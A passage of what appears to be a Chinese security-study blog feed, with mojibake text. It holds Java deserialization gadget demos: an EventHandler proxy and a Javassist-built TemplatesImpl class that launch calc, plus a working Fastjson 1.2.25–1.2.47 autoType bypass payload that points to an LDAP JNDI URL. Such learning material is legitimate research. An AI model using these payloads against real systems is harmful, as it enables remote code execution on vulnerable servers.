&#123;<br>        System.out.println(<span class="hljs-string">&quot;åƒé¦™è•‰&quot;</span>);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tester</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">HelloService</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloTrue</span>();<br>        <span class="hljs-type">EventHandler</span> <span class="hljs-variable">start</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>(<span class="hljs-string">&quot;calc.exe&quot;</span>), <span class="hljs-string">&quot;start&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>);<br>        <span class="hljs-type">HelloService</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (HelloService) Proxy.newProxyInstance(hello.getClass().getClassLoader(), hello.getClass().getInterfaces(), start);<br>        o.Apple();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>XStream</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javassist</title>
    <link href="/2022/03/09/Javasist/"/>
    <url>/2022/03/09/Javasist/</url>
    
    <content type="html"><![CDATA[<h1 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h1><p><strong>å¯ä»¥æ›´ç®€å•ã€å¿«é€Ÿçš„ç¼–è¾‘å’Œåˆ›å»ºJavaå­—èŠ‚ç çš„ç±»åº“ã€‚æˆ‘ä»¬çŸ¥é“ Java å­—èŠ‚ç ä»¥äºŒè¿›åˆ¶çš„å½¢å¼å­˜å‚¨åœ¨ class æ–‡ä»¶ä¸­ï¼Œæ¯ä¸€ä¸ª class æ–‡ä»¶åŒ…å«ä¸€ä¸ª Java ç±»æˆ–æ¥å£ã€‚Javaassist å°±æ˜¯ä¸€ä¸ªç”¨æ¥å¤„ç† Java å­—èŠ‚ç çš„ç±»åº“ã€‚</strong></p><p>ç”¨å‡ ä¸ªæ¡ˆä¾‹æ¥å­¦ä¹ ã€‚ï¼ˆä»ç½‘ä¸Šæœåˆ®çš„ï¼Œå¦‚æœ‰é›·åŒè¯·è”ç³»ä½œè€…åˆ é™¤ï¼‰</p><h2 id="Demo1"><a href="#Demo1" class="headerlink" title="Demo1"></a>Demo1</h2><h3 id="Helloç±»"><a href="#Helloç±»" class="headerlink" title="Helloç±»"></a>Helloç±»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Hello</span> &#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">syaHello</span><span class="hljs-params">()</span>&#123;<br>            System.out.println(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>            System.out.println(<span class="hljs-string">&quot;h3h3h3&quot;</span>);<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="ä¸»ç±»"><a href="#ä¸»ç±»" class="headerlink" title="ä¸»ç±»"></a>ä¸»ç±»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, InstantiationException, IllegalAccessException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> aDefault.get(<span class="hljs-string">&quot;xsw6a.Hello&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">syaHello</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;syaHello&quot;</span>);<br>        syaHello.setBody(<span class="hljs-string">&quot;System.out.println(\&quot;æˆ‘è¦æŠŠä½ å˜æˆxsw6_a\&quot;);&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> ctClass.toClass();<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aClass.newInstance();<br>        <span class="hljs-type">Hello</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>();<br>        hello.syaHello();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="è·å–ç±»"><a href="#è·å–ç±»" class="headerlink" title="è·å–ç±»"></a>è·å–ç±»</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">ClassPool</span> <span class="hljs-variable">aDefault</span> <span class="hljs-operator">=</span> ClassPool.getDefault(); <span class="hljs-comment">//ç±»åº“ï¼Œjvmä¸­æ‰€åŠ è½½çš„class</span><br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass</span> <span class="hljs-operator">=</span> aDefault.get(<span class="hljs-string">&quot;xsw6a.Hello&quot;</span>); <span class="hljs-comment">//è·å–å·²çŸ¥ç±»</span><br></code></pre></td></tr></table></figure><h3 id="è·å–æ–¹æ³•"><a href="#è·å–æ–¹æ³•" class="headerlink" title="è·å–æ–¹æ³•"></a>è·å–æ–¹æ³•</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">tMethod</span> <span class="hljs-variable">syaHello</span> <span class="hljs-operator">=</span> ctClass.getDeclaredMethod(<span class="hljs-string">&quot;syaHello&quot;</span>); <span class="hljs-comment">//è·å–å·²çŸ¥æ–¹æ³•</span><br></code></pre></td></tr></table></figure><h2 id="ä¿®æ”¹æ–¹æ³•ä¸­çš„ç±»å®¹"><a href="#ä¿®æ”¹æ–¹æ³•ä¸­çš„ç±»å®¹" class="headerlink" title="ä¿®æ”¹æ–¹æ³•ä¸­çš„ç±»å®¹"></a>ä¿®æ”¹æ–¹æ³•ä¸­çš„ç±»å®¹</h2><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lsl">syaHello.setBody(<span class="hljs-string">&quot;System.out.println(<span class="hljs-subst">\&quot;</span>æˆ‘è¦æŠŠä½ å˜æˆxsw6_a<span class="hljs-subst">\&quot;</span>);&quot;</span>); \\è¦†ç›–åŸå§‹çš„å†…å®¹ã€‚<br></code></pre></td></tr></table></figure><h4 id="æ³¨æ„"><a href="#æ³¨æ„" class="headerlink" title="æ³¨æ„"></a>æ³¨æ„</h4><p>è¿™é‡Œä¼šå®Œå…¨è¦†ç›–åŸæœ‰æ–¹æ³•é‡Œé¢çš„å†…å®¹ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091712635.png" alt="QQæˆªå›¾20220309171203"></p><h2 id="åŠ è½½ä¿®æ”¹åçš„ç±»"><a href="#åŠ è½½ä¿®æ”¹åçš„ç±»" class="headerlink" title="åŠ è½½ä¿®æ”¹åçš„ç±»"></a>åŠ è½½ä¿®æ”¹åçš„ç±»</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> ctClass.toClass(); <span class="hljs-comment">//ä½¿ç”¨å½“å‰ClassloaderåŠ è½½ä¿®æ”¹åçš„ç±»ã€‚</span><br></code></pre></td></tr></table></figure><h2 id="å°†å…¶å®ä¾‹åŒ–"><a href="#å°†å…¶å®ä¾‹åŒ–" class="headerlink" title="å°†å…¶å®ä¾‹åŒ–"></a>å°†å…¶å®ä¾‹åŒ–</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aClass.newInstance();<br><span class="hljs-type">Hello</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hello</span>();<br></code></pre></td></tr></table></figure><h2 id="Demo2"><a href="#Demo2" class="headerlink" title="Demo2"></a>Demo2</h2><p>ä¸ªäººæ„Ÿè§‰ä¸Šé¢çš„Demo1ç”¨å¤„ä¸å¤§ï¼Œæ„Ÿè§‰ç±»ä¼¼åŠ¨æ€ä»£ç†ï¼ˆä½†æ˜¯ä¸å¦‚åŠ¨æ€ä»£ç†ï¼‰ï¼Œä½†æ˜¯ä¼šå°†åŸæœ‰çš„ç±»çš„æ–¹æ³•å…¨éƒ¨è¦†ç›–äº†ã€‚ï¼ˆçº¯å±ä¸ªäººç†è§£ï¼ï¼ï¼ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Demo2</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> CannotCompileException, NotFoundException, InstantiationException, IllegalAccessException, ClassNotFoundException, SecurityException, NoSuchMethodException, IllegalArgumentException, InvocationTargetException, InvocationTargetException &#123;<br>        <span class="hljs-comment">// åˆ›å»ºç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;person&quot;</span>);<br><br>        <span class="hljs-comment">// æ·»åŠ ç§æœ‰æˆå‘˜nameåŠå…¶getterã€setteræ–¹æ³•</span><br>        <span class="hljs-type">CtField</span> <span class="hljs-variable">param</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtField</span>(pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>), <span class="hljs-string">&quot;name&quot;</span>, cls);<br>        param.setModifiers(Modifier.PRIVATE);<br>        cls.addMethod(CtNewMethod.setter(<span class="hljs-string">&quot;setName&quot;</span>, param));<br>        cls.addMethod(CtNewMethod.getter(<span class="hljs-string">&quot;getName&quot;</span>, param));<br>        cls.addField(param, CtField.Initializer.constant(<span class="hljs-string">&quot;&quot;</span>));<br><br>        <span class="hljs-comment">// æ·»åŠ æ— å‚çš„æ„é€ ä½“</span><br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">cons</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[] &#123;&#125;, cls);<br>        cons.setBody(<span class="hljs-string">&quot;&#123;name = \&quot;h3h3h3h3\&quot;;&#125;&quot;</span>);<br>        cls.addConstructor(cons);<br><br>        <span class="hljs-comment">// æ·»åŠ æœ‰å‚çš„æ„é€ ä½“</span><br>        cons = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[] &#123;pool.get(<span class="hljs-string">&quot;java.lang.String&quot;</span>)&#125;, cls);<br>        cons.setBody(<span class="hljs-string">&quot;&#123;$0.name = $1;&#125;&quot;</span>);<br>        cls.addConstructor(cons);<br><br>        <span class="hljs-comment">// æ‰“å°åˆ›å»ºç±»çš„ç±»å</span><br>        System.out.println(cls.toClass());<br><br>        <span class="hljs-comment">// é€šè¿‡åå°„åˆ›å»ºæ— å‚çš„å®ä¾‹ï¼Œå¹¶è°ƒç”¨getNameæ–¹æ³•</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;person&quot;</span>).newInstance();<br>        <span class="hljs-type">Method</span> <span class="hljs-variable">getter</span> <span class="hljs-operator">=</span> o.getClass().getMethod(<span class="hljs-string">&quot;getName&quot;</span>);<br>        System.out.println(getter.invoke(o));<br><br>        <span class="hljs-comment">// è°ƒç”¨å…¶setNameæ–¹æ³•</span><br>        <span class="hljs-type">Method</span> <span class="hljs-variable">setter</span> <span class="hljs-operator">=</span> o.getClass().getMethod(<span class="hljs-string">&quot;setName&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class&#125;);<br>        setter.invoke(o, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        System.out.println(getter.invoke(o));<br><br>        <span class="hljs-comment">// é€šè¿‡åå°„åˆ›å»ºæœ‰å‚çš„å®ä¾‹ï¼Œå¹¶è°ƒç”¨getNameæ–¹æ³•</span><br>        o = Class.forName(<span class="hljs-string">&quot;person&quot;</span>).getConstructor(String.class).newInstance(<span class="hljs-string">&quot;xsw6_a&quot;</span>);<br>        getter = o.getClass().getMethod(<span class="hljs-string">&quot;getName&quot;</span>);<br>        System.out.println(getter.invoke(o));<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç­‰æ•ˆä¸è¿™æ ·ï¼Ÿ</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">(String name)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        System.out.println(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>    &#125;<br><br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs haxe"><span class="hljs-keyword">package</span> xsw6a;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonTrue</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> void main(<span class="hljs-keyword">String</span>[] args) &#123;<br>        Person person = <span class="hljs-keyword">new</span> <span class="hljs-type">Person</span>();<br>        System.out.println(person);<br>        person.setName(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        person.getName(<span class="hljs-string">&quot;xsw6_a&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>åœ¨åç»­çš„å­¦ä¹ ä¸­ä¼šä¸æ–­æ¥æ›´æ–°çš„ã€‚å› ä¸ºæˆ‘æ„Ÿè§‰è¿™ä¸ªå­¦çš„æœ‰ç‚¹æ¨¡ç³Šã€‚</p><h2 id="åˆ©ç”¨javasistå®ç°TemplatesImp"><a href="#åˆ©ç”¨javasistå®ç°TemplatesImp" class="headerlink" title="åˆ©ç”¨javasistå®ç°TemplatesImp"></a>åˆ©ç”¨javasistå®ç°TemplatesImp</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.CannotCompileException;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.NotFoundException;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerConfigurationException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring2Demo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NotFoundException, CannotCompileException, IOException, TransformerConfigurationException &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">abstractTranslet</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;evil&quot;</span>);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(new String[]&#123;\&quot;calc\&quot;&#125;);&quot;</span>;<br>        clazz.makeClassInitializer().insertBefore(cmd);<br>        clazz.setSuperclass(abstractTranslet);<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setValue(<span class="hljs-string">&quot;_bytecodes&quot;</span>, templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;);<br>        setValue(<span class="hljs-string">&quot;_name&quot;</span>, templates, <span class="hljs-string">&quot;a&quot;</span>);<br>        setValue(<span class="hljs-string">&quot;_tfactory&quot;</span>, templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        templates.newTransformer();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(String name, Object target, Object value)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> target.getClass().getDeclaredField(name);<br>            field.setAccessible(<span class="hljs-literal">true</span>);<br>            field.set(target, value);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception ignore) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaWeb</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjsonï¼ˆ1.2.25-1.2.47ï¼‰</title>
    <link href="/2022/03/09/Fastjson%EF%BC%881-2-25-1-2-47%EF%BC%89/"/>
    <url>/2022/03/09/Fastjson%EF%BC%881-2-25-1-2-47%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-25-1-2-47"><a href="#Fastjson1-2-25-1-2-47" class="headerlink" title="Fastjson1.2.25-1.2.47"></a>Fastjson1.2.25-1.2.47</h1><p>é€šæ€ç‰ˆæœ¬ã€‚</p><ul><li>1.2.25-1.2.32ç‰ˆæœ¬ï¼šæœªå¼€å¯AutoTypeSupportæ—¶èƒ½æˆåŠŸåˆ©ç”¨ï¼Œå¼€å¯AutoTypeSupportä¸èƒ½åˆ©ç”¨</li><li>1.2.33-1.2.47ç‰ˆæœ¬ï¼šæ— è®ºæ˜¯å¦å¼€å¯AutoTypeSupportï¼Œéƒ½èƒ½æˆåŠŸåˆ©ç”¨</li></ul><p>è¿™é‡Œè¿˜æ˜¯ä¸€æ ·è¦ç”¨åˆ°ldapã€‚é…ç½®æŒ‰ç…§<strong>1.2.45</strong>æ‰€éœ€è¦çš„ç¯å¢ƒé…ç½®ã€‚</p><h1 id="ä¸ºä»€ä¹ˆè¿™é‡Œä¸å¼€å¯AutoTypeSupportä¹Ÿå¯ä»¥"><a href="#ä¸ºä»€ä¹ˆè¿™é‡Œä¸å¼€å¯AutoTypeSupportä¹Ÿå¯ä»¥" class="headerlink" title="ä¸ºä»€ä¹ˆè¿™é‡Œä¸å¼€å¯AutoTypeSupportä¹Ÿå¯ä»¥"></a>ä¸ºä»€ä¹ˆè¿™é‡Œä¸å¼€å¯AutoTypeSupportä¹Ÿå¯ä»¥</h1><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091302366.png" alt="QQæˆªå›¾20220309123409"></p><p>æ²¡æœ‰è¿›å…¥é»‘åå•åˆ é€‰ã€‚<br>è·Ÿè¿›ã€‚<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091304938.png" alt="QQæˆªå›¾20220309124256"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091302374.png" alt="QQæˆªå›¾20220309124530"></p><p>å‘ç°è¿™é‡Œä¼šå°†com.sun.rowset.JdbcRowSetImplåŠ è½½è¿›ç¼“å­˜ä¸­ã€‚<br>å°±ç›¸å½“äºè¿™ä¸€æ¬¡æ˜¯åˆ©ç”¨ç¼“å­˜åŠ è½½å‡º<strong>com.sun.rowset.JdbcRowSetImpl</strong>ç»•è¿‡äº†å„ç§é»‘åå•ã€‚</p><h2 id="å¼€å¯AutoTypeSupportæ—¶"><a href="#å¼€å¯AutoTypeSupportæ—¶" class="headerlink" title="å¼€å¯AutoTypeSupportæ—¶"></a>å¼€å¯AutoTypeSupportæ—¶</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203091258692.png" alt="QQæˆªå›¾20220309125840"></p><p>ç”±äºåŠ è½½äº†ç¼“å­˜ã€‚è¿™é‡Œä¼šæ˜¾ç¤ºnullï¼Œæ‰€ä»¥å°±è¿›ä¸å»é»‘åå•ã€‚<br>è‡³æ­¤fastjsonå°±å‘Šä¸€æ®µè½ã€‚åç»­å®˜æ–¹ç›´æ¥ç¦æ­¢äº†ç¼“å­˜ç±»åŠ è½½ã€‚overã€‚</p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;&#123;\&quot;a\&quot;:&#123; \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;, \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;, \&quot;b\&quot;:&#123; \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;, \&quot;dataSourceName\&quot;:\&quot;ldap://127.0.0.1:1389/Exploit\&quot;, \&quot;autoCommit\&quot;:true&#125;&quot;</span>;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Fastjson</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Fastjsonï¼ˆ1.2.25-1.2.45ï¼‰</title>
    <link href="/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-45%EF%BC%89/"/>
    <url>/2022/03/08/Fastjson%EF%BC%881-2-25-1-2-45%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<h1 id="Fastjson1-2-25-1-2-45"><a href="#Fastjson1-2-25-1-2-45" class="headerlink" title="Fastjson1.2.25-1.2.45"></a>Fastjson1.2.25-1.2.45</h1><p>è¿™é‡Œé€šè¿‡<strong>JNDI+LDAP</strong>ç»•è¿‡ã€‚<br>åˆ›å»ºLdapæœåŠ¡éœ€è¦ã€‚<br><code>unboundid-ldapsdk</code>åŒ…(<a href="https://repo1.maven.org/maven2/com/unboundid/unboundid-ldapsdk/5.1.3/unboundid-ldapsdk-5.1.3.jar)%E5%AF%BC%E5%85%A5idea%E5%B0%B1%E5%8F%AF%E3%80%82">https://repo1.maven.org/maven2/com/unboundid/unboundid-ldapsdk/5.1.3/unboundid-ldapsdk-5.1.3.jar)å¯¼å…¥ideaå°±å¯ã€‚</a></p><h2 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span 